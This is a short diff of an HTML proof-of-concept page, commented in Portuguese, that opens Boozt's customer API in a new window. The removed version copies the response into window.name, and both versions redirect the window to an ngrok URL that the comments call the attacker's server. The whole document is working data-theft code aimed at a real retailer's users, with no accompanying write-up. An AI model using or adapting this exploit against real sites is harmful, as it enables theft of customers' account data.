@@ -1,22 +1,12 @@
-<!-- arquivo: inicio.html -->
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"></head>
 <body>
   <script>
-    // Abre aba lateral com a Boozt
-    const win = window.open("https://www.boozt.com/at/de-at/api/customer", "poc");
+    const boozt = window.open("https://www.boozt.com/at/de-at/api/customer", "boozt", "width=600,height=500");
 
     setTimeout(() => {
-      try {
-        // Injetar o conteúdo da resposta no window.name
-        win.name = win.document.body.innerText;
-        // Redirecionar pro servidor do atacante
-        win.location = "https://7e4a-2804-4580-1080-7db-1219-7096-73d0-a45e.ngrok-free.app/save";
-      } catch (e) {
-        console.error("⚠️ Erro ao manipular janela: ", e);
-      }
-    }, 4000); // tempo pra carregar o JSON da Boozt
+      boozt.location = "https://7e4a-2804-4580-1080-7db-1219-7096-73d0-a45e.ngrok-free.app/save";
+    }, 2000);
   </script>
 </body>
 </html>
